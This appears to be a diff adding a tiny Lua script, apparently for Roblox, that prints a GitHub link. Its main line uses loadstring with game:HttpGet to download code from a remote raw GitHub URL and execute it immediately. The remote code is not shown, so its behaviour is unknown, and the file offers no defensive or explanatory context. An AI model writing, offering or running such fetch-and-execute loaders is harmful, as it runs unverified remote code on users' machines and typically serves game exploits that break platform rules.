@@ -1,0 +1,4 @@
+print("https://github.com/inscgot/secured3")
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Xcrobix/X/refs/heads/main/hopinh"))()
